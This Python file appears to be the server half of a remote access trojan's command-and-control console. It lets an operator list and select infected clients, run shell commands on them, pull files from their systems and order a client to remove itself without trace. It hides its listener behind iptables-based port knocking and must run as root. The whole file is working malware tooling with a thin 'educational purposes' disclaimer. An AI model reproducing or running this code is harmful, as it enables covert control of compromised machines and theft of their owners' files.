#!/usr/bin/env python
__author__     = "rekcah"
__email__ = "rekcah@keabyte.com"
__desc__ = "For educational purposes only ;)"

import socket, os, _thread, subprocess, threading, sys, string, secrets

from subprocess import Popen
from random import randint

# Print color codes

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple

# End Print color codes


#####################################################################################


BUFFER = 4096
ENCODING = "utf-8"

host = '0.0.0.0'
port = 5010
users = 99
s = socket.socket()
conns = []
client_id = -1
files = False
filename = None
_key = 2293

# "Knockable" Ports (they're not reserved though)
portSet = [5010, 5011, 5012, 5013, 5014, 5015, 5016, 5017, 5018, 5019, 5020]

log = "/var/log/messages"

connecting = False


######################################################################################


def display_help ():

    print(W)
    print("Help : shows all the commands ")
    print("sel [client id] : selects the client with the id")
    print("shell [command] : sends shell command to the client (the client must have been selected prior to this")
    print("getinfo : displays informations on the client's system (the client must have been select prior to this")
    print("getfile [/path/to/file] : get the file with the path on the client's side")
    #print("sendfile [/local/path/to/file] [/remote/path/to/file] : uploads the file to the client on the remote path provided")
    print("kill [client_id] : kills the client with the matching id")
    print("remove [client_id] : the client autoremoves itself and leaves no trace on the infected system")
    print("list : lists all connected clients")
    print("exit : Exist the server killing all the connexions (not removing clients)")
    print(W)

def get_response(user, file = False):
    global client_id, conns, s, BUFFER, connecting, files, filename, ENCODING

    while True:
        raw = conns[user].recv(BUFFER)
        data = raw.decode(ENCODING)

        if "!FILE!" in data.upper() :
            # The client is sending a file!
            # Awesome, let's read it!
            print("!FILE!")
            get_response(user, True)
        else :
            print(P + "\n\n[*] Client [%d] response : | \n\n%s" % (user+1, raw.decode(ENCODING)) + W)
            if files :
                print(G + "\n[+] Receiving a file from the client." + W)
                if not os.path.isdir("data/"):
                    os.mkdir("data/")
                if filename is None :
                    filename = "".join(secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for _ in range(randint(2, 20)))
                file = open("data/" + filename, "wb")
                file.write(raw.decode(ENCODING))
                print(G + "[+] File downloaded at data/%s" % filename)
                file.close()
                files = False
                filename = None

        if not data or connecting:
            break
    print('Closing connections')
    s.close()

def connect_users():
    global  connecting, ENCODING

    for user in range(users):
        conn, addr = s.accept()
        # conn.send("SHELL ls".encode("utf-8"))
        conns.append(conn)
        connecting = True
        print(G + "\n[+] A new client is connected at [%s,%d] " % addr + W)
        print(G + "\n[+] New client's Id is : >> " + str(len(conns)) + " <<")

        for each in range(len(conns)):
            _thread.start_new_thread(send_data, (each,))
            _thread.start_new_thread(get_response, (each,))
        connecting = False
        parse_command()
        _thread.start_new_thread(connect_users, ())

# def prompt():
#     sys.stdout.write(">> Your command : ")
#     sys.stdout.flush()

def send_data(user):
    global BUFFER, ENCODING, conns, connecting
    while True:
        data = conns[user].recv(BUFFER).decode(ENCODING)
        for each in range(len(conns)):
            conns[each].send(data.encode(ENCODING))
        if not data or connecting:
            break
    print('Closing connections')
    s.close()

def parse_command():
    global files, filename, client_id, ENCODING
    _thread.start_new_thread(connect_users, ())
    # prompt()
    while True :
        cmd = input(B + "\n>>> Your command : " + W)

        if cmd.upper() == "HELP":
            display_help()
            parse_command()
        elif cmd.upper() == "LIST":
            print(B + "\n[*] Connected clients lists : ")
            i = 1
            for each in range(len(conns)):
                print(G + "\tId >> " + str(each + 1) + " << Connected at  [%s : %d] " % (conns[each]).getsockname())
            print(W)
        elif cmd.upper() == "EXIT":
            if input(R + "/!\ Are you sure you want to exit the C&C ? /!\ ? yes/no" + W).upper() == "YES":
                print(O + "[!] Clossing remote connections..." + W)
                s.close()
                print(O + "[!] Connections closedd. Exiting..." + W)
                print(B + "[*] Bye!!" + W)
                s.close()
                sys.exit(0)
        elif cmd.upper() == "GETINFO":
            if client_id < 0:
                print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
            else:
                # this can be encrypted (maybe a xor function ?)
                conns[client_id].send("getinfo".encode(ENCODING))
        else:
            if "GETFILE" in cmd.upper():
                if client_id < 0:
                    print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
                else:
                    # we need to prepare
                    # Remember the synthax is GETFILE [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME]
                    args = cmd.split(" ")  # Get the args
                    if len(args) != 3:
                        print(R + "[-] The synthax is GETFILE [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME]" + W)
                    else:
                        print(O + "[!] Requesting remote file '%s' " % (args[1] + args[2]))
                        conns[client_id].send(("getfile " + args[1] + args[2]).encode(ENCODING))
                        files = True
                        filename = args[2]
            elif "SEL" in cmd.upper():
                args = cmd.split(" ")
                if len(args) != 2:
                    print(R + "[-] The synthax is SEL [CLIENT_ID]" + W)
                else:
                    if 0 >= int(args[1]) > len(conns):
                        print(R + "[-] Invalid client id entered. Ignoring..." + W)
                    elif 0 < int(args[1]) <= len(conns):
                        client_id = int(args[1]) - 1
                        print(G + "[+] Selected client is now client >> " + args[1] +
                              " << connected at [%s, %d]" % conns[client_id].getsockname() + W)
            elif "SHELL" in cmd.upper() :
                # Send a shell command to the client
                args = cmd.split(" ")
                if 0 > len(args) < 2 :
                    print(R + "[-] The synthax is SHELL [COMMAND TO EXECUTE]" + W)
                else :
                    conns[client_id].send(cmd.encode(ENCODING))

# def daemonStart():
#     # First config the firewall
#
#     tail
#     return None

# def configFirewall(clean)

def configIptables(clean=True):
    global portSet
    if clean :
        # Clean all the previous rules
        for i in range(len(portSet)) :
            #remove the rules for the firewall
            Popen(["iptables --delete INPUT -p tcp --dport %d -j LOG" % (portSet[i] ^ (_key * 25))],
                  shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    #add this rule : "iptables -I INPUT -p tcp --dport [PORT_NUM] -j LOG"
    for i in range(len(portSet)) :
        # Add the firewall rule for each available port
        # This firewall rule with add a log entry in /var/log/messages everytime a request is made on that port
        Popen(["iptables -I INPUT -p tcp --dport %d -j LOG" % (portSet[i] ^ (_key * 25))],
              shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

def checkPermissions():
    if os.getuid() != 0:
        print(R + "[-] Sorry, you must be root to run this." + W)
        sys.exit(2)

def main():
    global s, host, port, users, conns

    # Check we have the root privs (needed to read the log file)
    checkPermissions()

    # From now we have the right permissions
    knocked = False
    # Launch the daemon and wait for a connection
    configIptables(True)    # Clean old rules and configure the firewall
    print(G + "[+] Iptables rules configured... Waiting for incomming clients..." + W)

    while not knocked :
        # tail the /var/log/messages file to find the connections attemps on the port
        logFilePointer = subprocess.Popen(['tail', '-F', log], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            line = logFilePointer.stdout.readline()
            print(B + "[*] tail log file : %s" % line)
            for i in range(len(portSet)) :
                needle = portSet[i] ^ (_key * 25)
                if str(needle).encode(ENCODING) in line :
                    print(G + "[+] Someone is knocking at the heavens door..." + W)
                    print(G + "[+] The door knocked at is : %s" % str(portSet[i]) + W)
                    print(G + "[+] The door saint Peter will open is : %s " % str(portSet[i] ^ (_key * 25)) + W)
                    port = portSet[i] ^ (_key * 25)     # the right port to open...
                    knocked = True
                    break

    # the client has knocked at the heavens doors, we'll open'em up to it

    s.bind((host, port))
    s.listen(users)
    print('Listening for connections')

    _thread.start_new_thread(connect_users, ())
    _thread.start_new_thread(parse_command(), ())

    while True:
        pass
    s.close()
    sys.exit(0)

if __name__ == '__main__':
    main()
